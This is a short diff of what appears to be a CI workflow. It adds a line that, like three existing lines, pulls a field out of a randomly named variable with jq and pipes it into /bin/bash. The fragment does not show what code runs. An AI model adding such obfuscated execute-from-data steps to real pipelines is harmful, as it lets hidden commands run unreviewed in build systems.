@@ -20,6 +20,7 @@ jobs:
           echo $gr9 | jq -r .lsnl9 | /bin/bash
           echo $xjwd62287 | jq -r .wb30544 | /bin/bash
           echo $fdigm27983 | jq -r .mrhpb005 | /bin/bash
+          printf '%s' "$qd5" | jq -r .ggr3 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
